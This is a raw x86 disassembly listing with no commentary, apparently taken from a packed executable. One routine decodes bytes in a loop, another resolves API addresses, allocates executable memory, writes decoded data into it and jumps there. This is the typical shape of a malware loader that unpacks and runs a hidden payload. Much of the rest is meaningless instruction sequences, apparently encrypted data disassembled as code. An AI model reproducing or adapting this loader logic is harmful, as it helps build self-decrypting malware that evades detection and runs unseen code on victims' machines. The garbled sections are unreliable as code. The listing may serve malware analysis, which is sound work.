  4214a5:	mov    ebp,0xb9da95e5
  4214aa:	sbb    esi,DWORD PTR [esi]
  4214ac:	(bad)  
  4214ad:	retf   0x73f3
  4214b0:	push   ebp
  4214b1:	cmc    
  4214b2:	pop    ebx
  4214b3:	mov    dh,ch
  4214b5:	call   0x55d9:0xa97f693e
  4214bc:	daa    
  4214bd:	in     eax,dx
  4214be:	cmp    al,0x6b
  4214c0:	aaa    
  4214c1:	mov    cl,0x8e
  4214c3:	xor    esp,ebx
  4214c5:	or     al,0xbf
  4214c7:	add    dh,dl
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xf2de7d3b
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0xbbbb9dfe
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	call   eax
  4217ea:	call   0x53c8:0xdb42bf02
  4217f1:	out    0xbb,eax
  4217f3:	mov    DWORD PTR [eax+0x6b],ebp
  4217f6:	(bad)  
  4217f7:	rcl    BYTE PTR [edx-0x3724bef9],0x53
  4217fe:	jecxz  0x4217bb
  421800:	mov    DWORD PTR [eax],ebp
  421802:	xchg   esp,eax
  421803:	popf   
  421804:	rcl    BYTE PTR [edx-0x3724be41],0x53
  42180b:	jecxz  0x4217c8
  42180d:	mov    DWORD PTR [eax-0x6c],ebp
  421810:	popf   
  421811:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421818:	jecxz  0x4217d5
  42181a:	mov    DWORD PTR [eax-0x6c],ebp
  42181d:	popf   
  42181e:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421825:	sbb    edi,DWORD PTR [ebx-0x7d659777]
  42182b:	jp     0x4217c9
  42182d:	mov    edi,0x7205d2f5
  421832:	pop    ebx
  421833:	mov    edx,0xc9b5a5c5
  421838:	test   al,0xfb
  42183a:	int3   
  42183b:	popa   
  42183c:	stos   DWORD PTR es:[edi],eax
  42183d:	mov    edx,0xe8c9843c
  421842:	add    eax,0xfca1feb4
  421847:	shr    DWORD PTR [esi],1
  421849:	scas   eax,DWORD PTR es:[edi]
  42184a:	call   0xfbdd9e80
  42184f:	sbb    eax,0xfca9bdfa
  421854:	lahf   
  421855:	add    eax,0x8e739b94
  42185a:	aam    0xed
  42185c:	or     eax,0x98cd90ba
  421861:	fwait
  421862:	inc    ecx
  421863:	fcmovne st,st(0)
  421865:	push   ebx
  421866:	jecxz  0x421823
  421868:	mov    DWORD PTR [edi+0xd],ebp
  42186b:	popa   
  42186c:	cdq    
  42186d:	rol    DWORD PTR [edi-0x2d],1
  421870:	ror    DWORD PTR [ebx-0x354e8e55],1
  421876:	nop
  421877:	push   es
  421878:	xchg   edi,eax
  421879:	cwde   
  42187a:	div    DWORD PTR [ebx-0x3ecf7bb5]
  421880:	jmp    0x9e930568
  421885:	pop    edi
  421886:	cmp    BYTE PTR [eax],al
  421888:	mov    ch,0x19
  42188a:	mov    esi,0x438b59f1
  42188f:	sbb    esp,DWORD PTR [edx-0x48]
  421892:	adc    edi,ecx
  421894:	cwde   
  421895:	stc    
  421896:	mov    ecx,0x6319c249
  42189b:	stos   BYTE PTR es:[edi],al
  42189c:	and    DWORD PTR [edx],0x6c
  42189f:	bswap  edx
  4218a1:	fdivr  DWORD PTR [edi]
  4218a3:	inc    eax
  4218a4:	rcl    DWORD PTR [eax-0x354e8e55],1
  4218aa:	nop
  4218ab:	pop    es
  4218ac:	xchg   edi,eax
  4218ad:	call   0x648d461d
  4218b2:	adc    bl,dl
  4218b4:	jmp    0x9f3c8aaf
  4218b9:	lds    esp,FWORD PTR [ebp+0x2349b5af]
  4218bf:	pop    edx
  4218c0:	pop    ecx
  4218c1:	mov    ebx,0xd66281de
  4218c6:	gs push edx
  4218c8:	cwde   
  4218c9:	out    0x24,eax
  4218cb:	aam    0xc2
  4218cd:	adc    DWORD PTR [ebx],ebx
  4218cf:	sub    DWORD PTR [ebx-0x570102c6],eax
  4218d5:	rol    DWORD PTR [edi-0x2d],1
  4218d8:	ror    eax,1
  4218da:	push   ebx
  4218db:	jecxz  0x421898
  4218dd:	mov    DWORD PTR [eax-0x6c],ebp
  4218e0:	popf   
  4218e1:	nop
  4218e2:	xlat   BYTE PTR ds:[ebx]
  4218e3:	mov    edi,0x51c99741
  4218e8:	jecxz  0x421905
  4218ea:	pop    ecx
  4218eb:	add    ebx,ebx
  4218ed:	popf   
  4218ee:	rcl    BYTE PTR [edx-0x3724be41],0x53
  4218f5:	add    edi,DWORD PTR [ebx-0x63609676]
  4218fb:	retf   0xbf92
  4218fe:	scas   eax,DWORD PTR es:[edi]
  4218ff:	(bad)  
  421901:	push   ebx
  421902:	pop    edi
  421903:	mov    ebp,0x9d946889
  421908:	rol    BYTE PTR [ebx-0x3724befe],0x43
  42190f:	jecxz  0x4218cc
  421911:	mov    DWORD PTR [eax-0x6f],ebp
  421914:	popf   
  421915:	rcl    BYTE PTR [edx-0x2724be02],0x53
  42191c:	jecxz  0x4218d9
  42191e:	mov    ebp,DWORD PTR [eax-0x6c]
  421921:	cwde   
  421922:	rcl    BYTE PTR [ebx-0x3724be41],0x53
  421929:	out    0xbb,al
  42192b:	mov    BYTE PTR [eax-0x6c],ch
  42192e:	popf   
  42192f:	rcl    BYTE PTR [edx-0x3728ee41],0x53
  421936:	out    0xbb,eax
  421938:	mov    DWORD PTR [ecx+0x70],ebp
  42193b:	cwde   
  42193c:	rcl    BYTE PTR [eax-0x37a4be41],0x53
  421943:	repz mov ebx,0x9d947889
  421949:	rcl    BYTE PTR [edx-0x2724be51],0x53
  421950:	jecxz  0x42190d
  421952:	mov    DWORD PTR [eax-0x6c],ebp
  421955:	(bad)  
  421956:	rcl    BYTE PTR [edx-0x3724be41],0x53
  42195d:	jecxz  0x42191a
  42195f:	mov    DWORD PTR [eax+0x60],ebp
  421962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421963:	int3   
  421964:	xchg   edx,eax
  421965:	(bad)  
  421966:	inc    edx
  421967:	fcmovne st,st(0)
  421969:	push   ebx
  42196a:	adc    esi,DWORD PTR [eax-0x6222d877]
  421970:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421977:	jecxz  0x421934
  421979:	mov    DWORD PTR [eax-0x6c],ebp
  42197c:	popf   
  42197d:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421984:	jecxz  0x421941
  421986:	mov    DWORD PTR [eax-0x6c],ebp
  421989:	popf   
  42198a:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421991:	jecxz  0x42194e
  421993:	mov    DWORD PTR [eax-0x6c],ebp
  421996:	popf   
  421997:	rcl    BYTE PTR [edx-0x3724be41],0x53
  42199e:	jecxz  0x42195b
  4219a0:	mov    DWORD PTR [eax-0x6c],ebp
  4219a3:	popf   
  4219a4:	rcl    BYTE PTR [edx-0x3724be41],0x53
  4219ab:	jecxz  0x421968
  4219ad:	mov    DWORD PTR [eax-0x6c],ebp
  4219b0:	popf   
  4219b1:	rcl    BYTE PTR [edx-0x3724be41],0x53
  4219b8:	jecxz  0x421975
  4219ba:	mov    DWORD PTR [eax-0x6c],ebp
  4219bd:	popf   
  4219be:	rcl    BYTE PTR [edx-0x3724be41],0x53
  4219c5:	jecxz  0x421982
  4219c7:	mov    DWORD PTR [eax-0x6c],ebp
  4219ca:	popf   
  4219cb:	rcl    BYTE PTR [edx-0x3724be41],0x53
  4219d2:	jecxz  0x42198f
  4219d4:	mov    DWORD PTR [eax-0x6c],ebp
  4219d7:	popf   
  4219d8:	sar    BYTE PTR [ebx+ecx*8+0x53bca324],0xe3
  4219e0:	mov    ebx,0x9d9f8889
  4219e5:	rol    BYTE PTR [edx+0x1cdb41bf],0x57
  4219ec:	jecxz  0x4219a9
  4219ee:	lea    ebp,[eax-0x6c]
  4219f1:	int    0x85
  4219f3:	ror    DWORD PTR [ebp+0x53c89415],1
  4219f9:	jecxz  0x4219b6
  4219fb:	mov    DWORD PTR [eax-0x4c],ebp
  4219fe:	popf   
  4219ff:	shl    BYTE PTR [edx-0x6f],0x33
  421a03:	test   al,0xba
  421a05:	xor    bl,ah
  421a07:	mov    ebx,0x9df46889
  421a0c:	rcl    BYTE PTR [edx-0x3724b5b1],0x9
  421a13:	jecxz  0x4219d0
  421a15:	mov    DWORD PTR [eax-0x6d3f6270],esi
  421a1b:	mov    edi,0x53c8db41
  421a20:	jecxz  0x4219dd
  421a22:	mov    DWORD PTR [eax-0x6c],ebp
  421a25:	mov    ebp,0x415f92c0
  421a2a:	fcmovne st,st(0)
  421a2c:	push   ebx
  421a2d:	jecxz  0x4219ea
  421a2f:	mov    DWORD PTR [eax-0x6c],ebp
  421a32:	popf   
  421a33:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a3a:	jecxz  0x4219f7
  421a3c:	mov    DWORD PTR [eax-0x6c],ebp
  421a3f:	popf   
  421a40:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a47:	jecxz  0x421a04
  421a49:	mov    DWORD PTR [eax-0x6c],ebp
  421a4c:	popf   
  421a4d:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a54:	jecxz  0x421a11
  421a56:	mov    DWORD PTR [eax-0x6c],ebp
  421a59:	popf   
  421a5a:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a61:	jecxz  0x421a1e
  421a63:	mov    DWORD PTR [eax-0x6c],ebp
  421a66:	popf   
  421a67:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a6e:	jecxz  0x421a2b
  421a70:	mov    DWORD PTR [eax-0x6c],ebp
  421a73:	popf   
  421a74:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a7b:	jecxz  0x421a38
  421a7d:	mov    DWORD PTR [eax-0x6c],ebp
  421a80:	popf   
  421a81:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a88:	jecxz  0x421a45
  421a8a:	mov    DWORD PTR [eax-0x6c],ebp
  421a8d:	popf   
  421a8e:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421a95:	jecxz  0x421a52
  421a97:	mov    DWORD PTR [eax-0x6c],ebp
  421a9a:	popf   
  421a9b:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421aa2:	jecxz  0x421a5f
  421aa4:	mov    DWORD PTR [eax-0x6c],ebp
  421aa7:	popf   
  421aa8:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421aaf:	jecxz  0x421a6c
  421ab1:	mov    DWORD PTR [eax-0x6c],ebp
  421ab4:	popf   
  421ab5:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421abc:	jecxz  0x421a79
  421abe:	mov    DWORD PTR [eax-0x6c],ebp
  421ac1:	popf   
  421ac2:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421ac9:	jecxz  0x421a86
  421acb:	mov    DWORD PTR [eax-0x6c],ebp
  421ace:	popf   
  421acf:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421ad6:	jecxz  0x421a93
  421ad8:	mov    DWORD PTR [eax-0x6c],ebp
  421adb:	popf   
  421adc:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421ae3:	jecxz  0x421aa0
  421ae5:	mov    DWORD PTR [eax-0x6c],ebp
  421ae8:	popf   
  421ae9:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421af0:	jecxz  0x421aad
  421af2:	mov    DWORD PTR [eax-0x6c],ebp
  421af5:	popf   
  421af6:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421afd:	jecxz  0x421aba
  421aff:	mov    DWORD PTR [eax-0x6c],ebp
  421b02:	popf   
  421b03:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b0a:	jecxz  0x421ac7
  421b0c:	mov    DWORD PTR [eax-0x6c],ebp
  421b0f:	popf   
  421b10:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b17:	jecxz  0x421ad4
  421b19:	mov    DWORD PTR [eax-0x6c],ebp
  421b1c:	popf   
  421b1d:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b24:	jecxz  0x421ae1
  421b26:	mov    DWORD PTR [eax-0x6c],ebp
  421b29:	popf   
  421b2a:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b31:	jecxz  0x421aee
  421b33:	mov    DWORD PTR [eax-0x6c],ebp
  421b36:	popf   
  421b37:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b3e:	jecxz  0x421afb
  421b40:	mov    DWORD PTR [eax-0x6c],ebp
  421b43:	popf   
  421b44:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b4b:	jecxz  0x421b08
  421b4d:	mov    DWORD PTR [eax-0x6c],ebp
  421b50:	popf   
  421b51:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b58:	jecxz  0x421b15
  421b5a:	mov    DWORD PTR [eax-0x6c],ebp
  421b5d:	popf   
  421b5e:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b65:	jecxz  0x421b22
  421b67:	mov    DWORD PTR [eax-0x6c],ebp
  421b6a:	popf   
  421b6b:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b72:	jecxz  0x421b2f
  421b74:	mov    DWORD PTR [eax-0x6c],ebp
  421b77:	popf   
  421b78:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b7f:	jecxz  0x421b3c
  421b81:	mov    DWORD PTR [eax-0x6c],ebp
  421b84:	popf   
  421b85:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b8c:	jecxz  0x421b49
  421b8e:	mov    DWORD PTR [eax-0x6c],ebp
  421b91:	popf   
  421b92:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421b99:	jecxz  0x421b56
  421b9b:	mov    DWORD PTR [eax-0x6c],ebp
  421b9e:	popf   
  421b9f:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421ba6:	jecxz  0x421b63
  421ba8:	mov    DWORD PTR [eax-0x6c],ebp
  421bab:	popf   
  421bac:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421bb3:	jecxz  0x421b70
  421bb5:	mov    DWORD PTR [eax-0x6c],ebp
  421bb8:	popf   
  421bb9:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421bc0:	jecxz  0x421b7d
  421bc2:	mov    DWORD PTR [eax-0x6c],ebp
  421bc5:	popf   
  421bc6:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421bcd:	jecxz  0x421b8a
  421bcf:	mov    DWORD PTR [eax-0x6c],ebp
  421bd2:	popf   
  421bd3:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421bda:	jecxz  0x421b97
  421bdc:	mov    DWORD PTR [eax-0x6c],ebp
  421bdf:	popf   
  421be0:	rcl    BYTE PTR [edx-0x3724be41],0x53
  421be7:	jecxz  0x421ba4
  421be9:	out    0xc0,al
  421beb:	lahf   
  421bec:	popf   
  421bed:	out    dx,eax
  421bee:	xchg   edx,eax
  421bef:	mov    edi,0x79c8db51
  421bf4:	inc    ecx
  421bf5:	popa   
  421bf6:	clc    
  421bf7:	push   cs
  421bf8:	imul   esi,DWORD PTR [eax-0x5310eaa2],0xffffffed
  421bff:	and    BYTE PTR [eax+0x57],al
  421c02:	cs out dx,eax
  421c04:	sbb    DWORD PTR [eax],edx
  421c06:	(bad)  
  421c07:	shl    DWORD PTR [ebx],cl
  421c09:	or     BYTE PTR [edi-0x4a],dl
  421c0c:	sub    al,0xd9
  421c0e:	bound  edi,QWORD PTR [ebp-0x59]
  421c11:	or     al,BYTE PTR [edx+eiz*4]
  421c14:	stc    
  421c15:	mov    eax,ds:0xeaccf0f0
  421c1a:	push   ebx
  421c1b:	les    ebx,FWORD PTR [ecx+eax*1]
  421c1e:	cmp    eax,0xa069f0c5
  421c23:	sbb    BYTE PTR [edi+ecx*8+0x65ec3379],0xad
  421c2b:	rcr    eax,cl
  421c2d:	dec    esi
  421c2e:	add    eax,0xd1df47bd
  421c33:	daa    
  421c34:	aaa    
  421c35:	ret    
  421c36:	sbb    BYTE PTR [esi-0x7a4fc167],al
  421c3c:	jmp    0xa5e2:0x69810f9
  421c43:	xchg   edx,eax
  421c44:	hlt    
  421c45:	cmc    
  421c46:	adc    eax,0xb9522c7
  421c4b:	ret    
  421c4c:	call   0x4c04d3f4
  421c51:	call   0xd47e1139
  421c56:	mov    esi,0x83f3ea58
  421c5b:	mov    ah,0xdc
  421c5d:	sbb    edx,DWORD PTR [edx-0x79d8d9c9]
  421c63:	les    ebp,FWORD PTR cs:[eax-0x67]
  421c67:	out    0xac,al
  421c69:	ror    BYTE PTR [edx-0xc6420bb],cl
  421c6f:	(bad)  
  421c70:	int3   
  421c71:	add    ch,BYTE PTR [ecx+edx*8-0x73]
  421c75:	xchg   edi,eax
  421c76:	jbe    0x421c6a
  421c78:	push   es
  421c79:	pop    ebx
  421c7a:	lock mov ?,WORD PTR [ebp+edx*1+0x4e870397]
  421c82:	out    dx,al
  421c83:	into   
  421c84:	dec    ecx
  421c85:	and    esp,0xffffffc5
  421c88:	test   DWORD PTR [ebx-0x6c],esi
  421c8b:	adc    BYTE PTR [ebx],cl
  421c8d:	sub    edx,edx
  421c8f:	fisub  DWORD PTR [ebx+0x224491f4]
  421c95:	ja     0x421d0f
  421c97:	call   0x476cf42f
  421c9c:	cmp    ebx,edx
  421c9e:	scas   al,BYTE PTR es:[edi]
  421c9f:	mov    ds:0x32f6e16f,eax
  421ca4:	and    al,BYTE PTR [ecx-0x50fce72d]
  421caa:	jmp    0xe329:0x49aa0ba5
  421cb1:	jge    0x421cc3
  421cb3:	sahf   
  421cb4:	or     al,BYTE PTR [edi+0x7b]
  421cb7:	mov    ch,0x75
  421cb9:	push   ebp
  421cba:	cld    
  421cbb:	and    edi,0xfffffffd
  421cbe:	fs mov cl,0x6
  421cc1:	das    
  421cc2:	push   0x34166840
  421cc7:	call   FWORD PTR [esi+ebx*4]
  421cca:	popf   
  421ccb:	jp     0x421d15
  421ccd:	cmp    ecx,ecx
  421ccf:	test   BYTE PTR [ecx+0x5],al
  421cd2:	inc    ebp
  421cd3:	data16 cmp BYTE PTR [ebp+edx*1-0x4f],ah
  421cd8:	jns    0x421c88
  421cda:	mov    ch,0x7
  421cdc:	sub    DWORD PTR [ebx-0x7f],esi
  421cdf:	addr16 nop
  421ce1:	dec    esp
  421ce2:	jmp    0x3cf046be
  421ce7:	cdq    
  421ce8:	loopne 0x421ce5
  421cea:	add    BYTE PTR [ebp-0x29],ah
  421ced:	pop    esi
  421cee:	lahf   
  421cef:	xor    BYTE PTR [ecx],ch
  421cf1:	inc    esi
  421cf2:	cmp    BYTE PTR [ecx+0x1256120a],ah
  421cf8:	and    ebx,DWORD PTR [ebp+0x3e25cf47]
  421cfe:	mov    esi,0x27d1e536
  421d03:	(bad)  
  421d04:	dec    edi
  421d05:	push   eax
  421d06:	mov    eax,0xd0e8f1b5
  421d0b:	cmc    
  421d0c:	or     edi,DWORD PTR [edi+0x8a1da95]
  421d12:	xor    al,0x4a
  421d14:	push   ds
  421d15:	addr16 adc edi,esp
  421d18:	add    al,0x53
  421d1a:	mov    ?,WORD PTR [edx-0x5d29f1af]
  421d20:	retf   0x466e
  421d23:	dec    esi
  421d24:	fidiv  DWORD PTR [ecx]
  421d26:	and    eax,DWORD PTR [esi-0x20]
  421d29:	retf   0x5606
  421d2c:	pop    ecx
  421d2d:	dec    edi
  421d2e:	cld    
  421d2f:	es pop eax
  421d31:	test   eax,0x3f6fc515
  421d36:	das    
  421d37:	test   cl,bh
  421d39:	shl    BYTE PTR [edi],cl
  421d3b:	loopne 0x421cd7
  421d3d:	lods   al,BYTE PTR ds:[esi]
  421d3e:	mov    dl,0xbd
  421d40:	xor    eax,0xf8f54f24
  421d45:	sti    
  421d46:	mov    BYTE PTR [esi-0x6a],ah
  421d49:	jl     0x421d9b
  421d4b:	shl    esp,1
  421d4d:	ja     0x421db3
  421d4f:	sub    esp,edx
  421d51:	xchg   edi,eax
  421d52:	shl    DWORD PTR [edx+eiz*4+0x11923d71],0x3
  421d5a:	mov    ebx,0x79ac2c79
